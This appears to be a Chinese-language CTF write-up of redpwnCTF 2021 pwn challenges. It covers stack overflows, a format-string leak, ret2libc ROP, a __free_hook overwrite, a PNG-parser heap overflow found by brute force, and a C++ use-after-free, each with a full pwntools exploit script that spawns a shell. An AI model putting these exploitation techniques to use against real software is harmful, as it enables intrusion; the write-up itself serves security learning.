---
title: redpwn2021_pwn
date: 2021-07-26 16:47:55
permalink: /pages/993e16/
categories:
  - ctf_wp
  - redpwn
tags:
  - 
---
# redpwn2021_pwn(1)

[[toc]]

第一部分, 十解以上的题目.

剩下五道题目, 难度极大, 选择摆烂

## beginner-generic-pwn-number-0

比较简单的栈溢出, 覆盖栈内的局部变量, 

![image-20210726165054870](https://i.loli.net/2021/07/26/VRAFPbyzTODxs5Z.png)

```python
def exp():
    sla("message to cheer me up? :(", flat('a' *0x28, -1))
```



## ret2ret2the-unknowngeneric-flag-reader

栈溢出, 基本没有保护, 跳到后门函数即可打印flag,

```python
from pwn import *  

context.arch='amd64'

# cn = process("./bin")
cn = remote("mc.ax", 31077)

payload = flat('a' * 0x20, 1, 0x00000000004011F6)
cn.sendline(payload)

cn.interactive()
```



##  printf-please

flag在栈上, 存在一个格式化字符串漏洞, 但是没有直接指向的指针, 于是用%p打印, 并接受转为字符串,

```python 
from pwn import *  
import codecs

context.arch='amd64'

# cn = process("./bin")
cn = remote("mc.ax", 31569)


# gdb.attach(cn, 'b * $rebase(0x0000000000001274)')

payload = flat("pleaseaa%70$p%71$p%72$p%73$p%74$p0x")
cn.sendline(payload)
a = cn.recvuntil('0x')[:-2]
a0 = codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[:-2], 'hex')[::-1]
a0 += codecs.decode(cn.recvuntil('0x')[1:-2], 'hex')[::-1]
print(a0)

cn.interactive()


```



## ret2the-unknown

先输入, 然后会给一个libc地址, 于是先回到main函数循环一次, 然后再构造getshell

```python
from pwn import * 

context.arch='amd64'

# cn = process("./bin")
cn = remote("mc.ax", 31568)

libc = ELF("./libc-2.28.so")

main = 0x000000000401186

cn.sendlineafter("get there safely?", flat('a' * 0x20, 0, main))
cn.recvuntil("to get there: ")
printf = int(cn.recv(12), 16)
blibc  = printf - libc.sym['printf']
print("blibc: " + hex(blibc))
system = blibc + libc.sym['system']
binsh  = blibc + next(libc.search(b"/bin/sh\x00"))
poprdi = 0x0000000004012A3
ret    = 0x0000000004012A4

cn.sendline(flat('a'*0x20, 0, ret, poprdi, binsh, system))


cn.interactive()

```

## simultaneity

代码比较简单, 任意malloc一个大小, 然后通过距离可以构造一个任意地址写, 然后就推出了,使用`_exit`退出无法利用.

![image-20210726170032665](https://i.loli.net/2021/07/26/xKsGIduoeE6mRb5.png)

通过mmap出的堆块到libc距离固定的机制可以得到libc地址,

然后另一个技巧是scanf接收大量数据的时候也会使用malloc和free使用一个堆空间来放置输入的机制, 他的运行流程是, 先malloc一个堆块, 然后读取进来, 然后写入目标位置以后free掉, 

于是我们修改free_hook, 前缀大量的"0", 会使用堆块机制, 写入onegadget,  在free的时候getshell

```python
from pwn import * 

context.arch='amd64'
context.log_level='debug'

# cn = process("./bin")
cn = remote("mc.ax", 31547)

# gdb.attach(cn, "b * $rebase(0x000000000000125C)")
cn.sendlineafter("how big?", str(0x300000))
cn.recvuntil("you are here: 0x")

heap = int(cn.recv(12), 16) - 0x10
print("heap: " + hex(heap))

blibc = heap+ 0x301000
print("blibc: " + hex(blibc))

libc = ELF("./libc.so.6")
len = libc.sym['__free_hook'] + 0x301000 - 0x10
print("len: " + hex(len))

cn.sendlineafter("how far?", str(len // 8))
cn.sendlineafter("what?", '0' * 0x800 + str(blibc + 0xe5456))

cn.interactive()

```

## image-identifier

### 分析

首先输入要输入的文件长度, 然后输入一个文件, 检测文件头标识并使用bmp或png文件,

但是bmp解析几个函数基本啥都没写, 应该是要用png, 然后后面是先文件头检测, 然后chunk检测, 最后是foot, 

注意是吧函数指针写入到堆块中, 然后通过堆块调用函数的, 并且输入的文件和函数指针堆块相邻, 程序也提供了后门函数,

应该是在foot调用的时候被修改了, 调用为win函数, 然后head函数没有什么写入堆内的操作, 应该漏洞在chunk内, 

![image-20210726173621920](https://i.loli.net/2021/07/26/ATDLJpEPblMS6g2.png)

![image-20210726173637569](https://i.loli.net/2021/07/26/loV8AFIrcQOdNHP.png)

按照上面的思路分析几个函数, 的确在`pngChunkValidate`函数找到了一个堆溢出.

这个len可以控制, 但是后面的写入回去写入的是crc后的数据, 

![image-20210726181115965](https://i.loli.net/2021/07/26/zvp3NajTAGFqSWI.png)

先实现修改, 这里首先设置了文件头和绕过`pngHeadValidate`函数中的两个检测, 其它位置默认填充'\x00', 

```python
leng = 0x29
cn.sendlineafter("How large is your file?\n\n", str(leng))
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

# pngHeadValidate
#   check1
data[11] = 0xd
#   check2 crc
data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd
```

然后发现0x21(33)的位置进入`pngChunkValidate`函数, 

```python
len = (data[0x21] << 24) | (data[0x22] << 16) | (data[0x23] << 8) | (data[0x24]) 
```

然后计算到达`(checker->footer)`的距离, `0x30-1-8`指针会移动到`0x8042f0`, 然后是crc写入到foot的位置, 

![image-20210726182247241](https://i.loli.net/2021/07/26/j5ywsfuIHQetA8x.png)

![image-20210726182424236](https://i.loli.net/2021/07/26/mxQ72I61MuOEJLh.png)

现在修改值已经实现, 如果得到crc后是win函数地址的数据呢, 

### 爆破

我写了一个爆破脚本:

```python
from pwn import * 
import time
context.arch='amd64'
# context.log_level='error'
# context.terminal = ['tmux', 'splitw', '-h']

# cn = remote("mc.ax", 31412)


leng = 0x29
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

data[11] = 0xd

data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd

data[0x24] = 0x30 - 1 - 8


for i in range(0, 0xff):
    for j in range(0, 0xff):
        cn = process("./chal")
        cn.sendlineafter("How large is your file?\n\n", str(leng))
        # wow, this causes `updata_crc` to return 0x1818
        data[0x25] = i
        data[0x26] = j

        # data[0x28] = 0x1
        cn.sendafter("please send your image here:\n\n", bytes(data))
        cn.sendlineafter("do you want to invert the colors?\n", "y")

        time.sleep(0.5)

        print("i: " + hex(i) + "\nj: " + hex(j))

        if cn.poll() == None :
            print("!!!")
            break;
        cn.close()

```

然后我得到了这些数据, 并逐个调试查看他们跳到哪些位置:

```
`i=0x04, j=0x40`: 0x4018e4 (main+185)

`i=0x07, j=0x7d`: 0x401179 (_start+9)

`i=0x0b, j=0xf3`: 0x4018ee (main+195) 

`i=0x11, j=0x15`: 0x4018c7 (main+156)

`i=0x15, j=0x37`: 0x40182b (main)

`i=0x18, j=0x0b`: 0x401818 (win+4) !!!!!!!!!!!

`i=0x1f, j=0x14`: 0x401169 (exit@plt+9)

`i=0x21, j=0xc7`: 0x4018e7 (main+188)

`i=0x22, j=0xfa`: 0x40117a (_start+10)
```

### 利用

其中有一个是成功的, 于是有了最终的利用脚本

```python
from pwn import * 
context.arch='amd64'
context.log_level='debug'
# context.terminal = ['tmux', 'splitw', '-h']

cn = process("./chal")
# cn = remote("mc.ax", 31412)

bps = [0x0000000000401A6B, 0x000000000401A3F, 0x00000000004015F9, 0x00000000004015E1]
# bps = [0x000000000401A6B]
cmd = "" 
for bp in bps:
    cmd += "b * {}\n".format(bp)
print(cmd)
gdb.attach(cn, cmd)

leng = 0x29
cn.sendlineafter("How large is your file?\n\n", str(leng))
pngheader = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]
data = list(flat(bytes(pngheader), 'a').ljust(leng, b'\x00'))

# pngHeadValidate
#   check1
data[11] = 0xd
#   check2 crc
data[29] = 0xc9
data[30] = 0xef 
data[31] = 0xf1
data[32] = 0xbd

# pngChunkValidate: len 
data[0x24] = 0x30 - 1 - 8

# wow, this causes `updata_crc` to return 0x1818
# data[0x25] = 0x18
# data[0x26] = 0x0b

data[0x25] = 0x18
data[0x26] = 0x0b


cn.sendafter("please send your image here:\n\n", bytes(data))
cn.sendlineafter("do you want to invert the colors?\n", "y")

cn.interactive()
```

## panda-food

### 分析

直接给了源码, 是个类似菜单的题目, 然后使用了一堆stl的东西, 我都不会...现搜..

程序使用了`unique_ptr`的智能指针, 但是`favorite`使用的是裸指针, 导致智能指针释放的时候存在uaf,

```c++
#include <iostream>
#include <string>
#include <bits/stdc++.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>


class Food {
 public:
  Food(std::string name) : name_(std::move(name)) {}

  virtual void Eat() {
    std::cout << "om nom nom" << std::endl; 
  }

  void PrintName() {
    std::cout << "name: " << name_ << std::endl;
  }
 //private:
  std::string name_;
};

class Bamboo : public Food {
 public:
  Bamboo(const std::string&& name) : Food(std::move(name)) {}

  virtual void Eat() {
    std::cout << "crunch crunch" << std::endl;
  }
};

inline size_t get_idx() {
  size_t idx;

  std::cout << "idx: " << std::endl;
  std::cin >> idx;
  return idx;
}

uint64_t rand64() {
  uint64_t var = 0;
  static int ufd = open("/dev/urandom", O_RDONLY);

  if (read(ufd, &var, sizeof(var)) != sizeof(var)) {
    perror("ufd read");
    exit(1);
  }

  return var;
}

int main() {
  std::map<size_t, std::unique_ptr<Food>> foods;
  Food* favorite = nullptr;

  int choice;
  while (true) {
    std::cout << "choice: " << std::endl;
    std::cin >> choice;

    switch (choice) {
      case 0: {
        size_t idx = get_idx();

        std::unique_ptr<Food> tmp;
        std::string name;


        std::cout << "name: " << std::endl;
        std::cin >> name;

        if (name.length() > 0x1000) {
          std::cout << "too big :/" << std::endl;
          _Exit(1);
        } else {
          if (rand64() % 2 == 1) {
            tmp = std::make_unique<Bamboo>(std::move(name));
          } else {
            tmp = std::make_unique<Food>(std::move(name));
          }


          foods[idx] = std::move(tmp);
        }
        break;
      }
      case 1: {
        size_t idx = get_idx();

        favorite = foods[idx].get();
        break;
      }
      case 2: {
        if (favorite) favorite->PrintName();
        else std::cout << "set a favorite first!" << std::endl;
        break;
      }
      case 3: {
        char one_gadget_padding[0x100];
        memset(one_gadget_padding, 0, sizeof(one_gadget_padding));

        if (favorite) favorite->Eat();
        else std::cout << "set a favorite first!" << std::endl;
        break;
      }
      case 4: {
        _Exit(0);
        break;
      }
        
    }
  }
  
  return 0;
}

```

简单调试,发现题目中的对象和字符串都是在堆里面的, 然后堆的大小会根据输入字符串大小决定, 

先写对应交互的函数:

```python 
def new(idx, name):
    sla("choice:", '0')
    sla("idx:", str(idx))
    sla("name:", name)

def set(idx):
    sla("choice:", '1')
    sla("idx:", str(idx))

def show():
    sla("choice:", '2')

def eat():
    sla("choice:", '3')
```



### 堆部分

借助`ltrace`的调试, 可以简单理解这个过程:

![image-20210726190041711](https://i.loli.net/2021/07/26/RmA9Izw8hdQMrVx.png)

#### std::string类型

`string`这个类型大概如下, 

如果是0x10以内的,会直接存放在放置指针的位置,

大于0x10, 会尝试申请内存块, 并读取一部分, 如果没有读取完会再申请个翻倍的内存块,然后复制进去数据, 释放掉原来的, 一直重复这个过程直到找到合适的内存块存放, 

```c
struct	string {
    char * buf; 
    size_t buf_size;
} /  {
    char buf[0x10];
}
```

然后经过测试, buffer申请内存的顺序:

```
buf :
	0x1f;  -- 0x30 
	0x3d;  -- 0x50
	0x79;  -- 0x90
	0xf1;  -- 0x100
	0x1e1; -- 0x1f0
	0x3c1; -- 0x3d0
	0x781; -- 0x790
```

#### class类型

其实可以看到, 是先创建了string的堆块, 然后创建了class的堆块,class堆块一直是`malloc(0x28)`大小, 一个0x30大小的chunk, 他的格式:

```c
struct food {
	void ** func; // !!! 

	string {
		char * buf; 
		size_t buf_size;
	} / {
		char buf[0x10];
	}
	size_t chunk_size; 			
}
```

其中比较重要的就是func指向vtable表然后指向对应函数, 程序中的`eat`功能就是调用这个函数.

两种类型定义并不一致, 而且是通过rand随机数判断的,这回导致我们的堆块地址不定, 

```c++
 public:
  Bamboo(const std::string&& name) : Food(std::move(name)) {}

 public:
  Food(std::string name) : name_(std::move(name)) {}

```

其中string类型和我们上述的预期行为一致, 但是string&&类型, 会再申请一个长度为strlen(name)的堆块, 

string堆块: 

![image-20210727112900135](https://i.loli.net/2021/07/27/K3cDVurTNpZhwG9.png)

string&& 堆块:

![image-20210727112835314](https://i.loli.net/2021/07/27/gZwe7VI8KkLpq2M.png)

### 利用

可以大体看出来, 

新建食物, 可以通过name的长度实现对应大小的堆块malloc, 

然后重复新建食物会从`foods`中删除, 由于是智能指针没有引用的时候会自动删除,于是实现了free的功能, 

然后借助`favorite`是裸指针, 导致uaf, 通过print_name可以泄漏内存,通过eat实现控制程序流, getshell, 

另外一点在与`ltrace`调试比较有趣的一点, 释放顺序是(string class), 获取顺序是(string, class), 是有机会拿到string和刚被free的class重合的, 

![image-20210726202910183](https://i.loli.net/2021/07/26/8rRWysbacli9Y7d.png)

然后直接可以当成一个堆题打了,

首先泄漏, class大小是0x30, 为放到tcache中, 此时class->buf的位置正好是tcache中key的位置, 指向tcache+0x10, 而且打印通过class->buf_size控制打印的数据量, 我们可以直接用一个很大的数据, 这样有一个unsortedbin, 同时可以通过class->buf=tcache_key泄漏tcache内的堆地址,

```python
    new(0, 'a' * 0x780)
    # class0, name0
    set(0)
    new(0, 'b' * 0x30)
```

这时候, show/eat对应的class堆块已经是被free的了, 此时bin中:tcache->class0, name0在unsortedbin中, show的时候运行的大概是`write(0, class->buf, class->buf_size)`, 此时class0->buf=tcache+0x10, class0->buf_size=0x780, 

![image-20210727113647478](https://i.loli.net/2021/07/27/5hcgOITe3PkvNbi.png)

这时候直接show, 可以获取tcache内堆块,可以拿到堆地址,

```python
    show()
    ru("name: ")
    re(0x48, 2)
    heap = u64(re(8, 2))
    slog['heap'] = heap
    bheap = heap - 0x13290
    slog['bheap'] = bheap
    unsorted_chunk = 0x13af0 + bheap
    slog['unsorted_chunk'] = unsorted_chunk
```

然后获取到我们输入的name0(unsorted_chunk), 

新建class1, 输入len(name1)=0x18, 在string的机制里,可以获取到一个`0x30`大小chunk, 即获取到class0, 然后我们的输入可以伪造class的前0x18字节, 即`class0->fun`, `class->buf`, `class->buf_size`, 此时伪造func没有意义, 我们伪造buf指向在unsortedbin中的那个chunk, 打印出main_aeran, 

```python

    payload = flat(0, unsorted_chunk+0x10, 0x100)
    new(1, payload)

    show()
    ru("name: ")
    while (1):
        main_arean = u64(re(8, 2))
        if main_arean == 0x3a6563696f68630a:
            raise EOFError;
        libc = main_arean - 0x3ebca0
        if (libc & 0xfff == 0):
            break;
    slog['main_arean'] = main_arean 
    slog['libc'] = libc 
```

因为两种class是随机的, 所以会有概率性能否获取到, 而且堆风水也概率性, 这里选择buf_size加大, 然后直接用了个循环, 在这些空间尝试读取, 仍然不行的话就算了, 

后续拿到libc以后, 我们可以通过docker了解到他使用ubuntu18.04, 

于是再次使用类似的手段,只是获取到class以后, 修改`class->fun`然后直接eat运行onegadget即可.

> 注意的一点是class->func类型是双重指针,他先指向vtable, 然后vtable指向的最后要调用的函数地址,  因此我们先写上onegadget 存放的地址, 在写上onegadget, 
>
> 此时已经知道堆地址, 也就直接写在后面了, 

```python
    one = [0x4f3d5, 0x4f432, 0x10a41c]
    ogg = slog['libc'] + one[1]
    print("one: " + hex(ogg))
    pogg = slog['bheap'] + 0x13a98
    print("poop: " + hex(pogg))

    set(1)
    new(1, 'b' * 0x18)
    new(2, flat(pogg, ogg).ljust(0x18, b'c'))
    eat()
```



完整exp

::: details

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2020 wlz <wlz@kyria>
#
# Distributed under terms of the MIT license.

from pwn import * 

pie  = 1
arch = 64
bps  = [0x0000000000015471, 0x000000000001595B, 0x000000000001548F]

def new(idx, name):
    sla("choice:", '0')
    sla("idx:", str(idx))
    sla("name:", name)

def set(idx):
    sla("choice:", '1')
    sla("idx:", str(idx))

def show():
    sla("choice:", '2')

def eat():
    sla("choice:", '3')

def exp():
    new(0, 'a' * 0x780)
    set(0)
    gdba()

def exp1():
    new(0, 'a' * 0x780)
    set(0)
    new(0, 'b' * 0x30)

    # new(0, 'c' * 0x18)
    show()
    ru("name: ")
    re(0x48, 2)
    heap = u64(re(8, 2))
    slog['heap'] = heap
    bheap = heap - 0x13290
    slog['bheap'] = bheap
    unsorted_chunk = 0x13af0 + bheap
    slog['unsorted_chunk'] = unsorted_chunk

    payload = flat(0, unsorted_chunk+0x10, 0x100)
    new(1, payload)

    show()
    ru("name: ")
    while (1):
        main_arean = u64(re(8, 2))
        if main_arean == 0x3a6563696f68630a:
            raise EOFError;
        libc = main_arean - 0x3ebca0
        if (libc & 0xfff == 0):
            break;
    slog['main_arean'] = main_arean 
    slog['libc'] = libc 
    

def exp2():
    one = [0x4f3d5, 0x4f432, 0x10a41c]
    ogg = slog['libc'] + one[1]
    print("one: " + hex(ogg))
    pogg = slog['bheap'] + 0x13a98
    print("poop: " + hex(pogg))

    set(1)
    new(1, 'b' * 0x18)
    new(2, flat(pogg, ogg).ljust(0x18, b'c'))
    eat()


context.os='linux'

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

slog = {'name' : 111}
local = int(sys.argv[1])

if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'

if local:
    cn = process('./rbin')
    # cn = process(['./ld', './bin'], env={"LD_PRELOAD":"./libc"})
else:
    cn = remote( )

elf = ELF('./bin')

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)

while 1:
    try:
        cn = process('./rbin')
        # cn = remote("mc.ax", 31707)
        exp1()
        break
    except EOFError:
        continue

exp2()

slog_show()

ia()


```



:::
